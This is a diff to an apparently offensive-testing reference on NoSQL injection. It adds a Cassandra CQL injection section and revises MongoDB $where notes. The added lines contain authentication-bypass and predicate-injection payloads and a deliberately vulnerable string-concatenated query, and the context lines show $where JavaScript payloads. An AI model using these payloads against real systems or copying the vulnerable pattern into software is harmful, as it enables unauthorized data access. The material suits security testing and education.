@@ -31,6 +31,11 @@ NoSQL injection exploits the mismatch between how applications pass user input t
 - Filter expression injection (PartiQL, FilterExpression operators)
 - Attribute name/value collisions in expression maps
 
+**Cassandra**
+- CQL injection via string concatenation into `SELECT`/`INSERT`/`UPDATE` statements
+- `ALLOW FILTERING` queries with injected predicates
+- User-defined function (UDF) injection when user input flows into function bodies
+
 **CouchDB**
 - JavaScript `_design` document injection via Mango query selectors
 - MapReduce function injection if user controls design doc content
@@ -102,7 +107,7 @@ Binary search the character space to minimize requests. Works on any string fiel
 
 ### `$where` JavaScript Injection
 
-If `$where` operator is enabled (disabled by default in MongoDB 4.4+), inject arbitrary server-side JavaScript:
+If `$where` operator is enabled (disabled by default in MongoDB 7.0+; MongoDB 4.4–6.x deprecated it but left `javascriptEnabled` defaulting to `true`), inject arbitrary server-side JavaScript:
 ```json
 {"$where": "function(){return this.username == 'admin' && sleep(2000)}"}
 {"$where": "function(){return this.role == 'admin'}"}
@@ -157,6 +162,30 @@ SELECT * FROM Users WHERE username = 'input'
 -- Injected:
 SELECT * FROM Users WHERE username = 'x' OR '1'='1
 ```
+
+### Cassandra CQL Injection
+
+Cassandra Query Language (CQL) is syntactically similar to SQL. When user input is concatenated directly into CQL statements rather than using prepared statements (`session.prepare()`), injection is possible:
+
+```python
+# Vulnerable — string concatenation
+query = f"SELECT * FROM users WHERE username = '{username}'"
+
+# Injected: username = "' OR '1'='1
+SELECT * FROM users WHERE username = '' OR '1'='1'
+```
+
+**Authentication bypass:**
+```
+username: ' OR '1'='1' ALLOW FILTERING --
+```
+
+**Token extraction via UNION-style (Cassandra supports `IN` lists):**
+```
+username: 'x' OR token(username) > token('a') ALLOW FILTERING--
+```
+
+Cassandra does not support `SLEEP` or out-of-band primitives natively, so injection detection relies on boolean/error responses. Prepared statements (parameterized queries via the driver's `execute(prepared, [values])`) are the complete fix.
 
 ## Bypass Techniques
 
@@ -214,7 +243,7 @@ SELECT * FROM Users WHERE username = 'x' OR '1'='1
 
 1. Always try both JSON body (`{"field": {"$ne": null}}`) and bracket-notation form (`field[$ne]=`) — different middleware handles them differently
 2. Target reset token and API key fields with `$regex` extraction, not just passwords
-3. Check MongoDB driver version via error messages; `$where` is available and dangerous on pre-4.4
+3. Check MongoDB version via error messages or `/admin/serverStatus`; `$where` is active by default on pre-7.0 instances — that includes 4.4–6.x targets where `javascriptEnabled` was deprecated but not yet disabled, making them still exploitable unless explicitly hardened
 4. In Mongoose, `{strict: false}` passes arbitrary operators to MongoDB — grep the codebase if you have access
 5. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
 6. Redis injection requires newline characters (`\r\n`) in the injected value — verify URL encoding handling in the chain
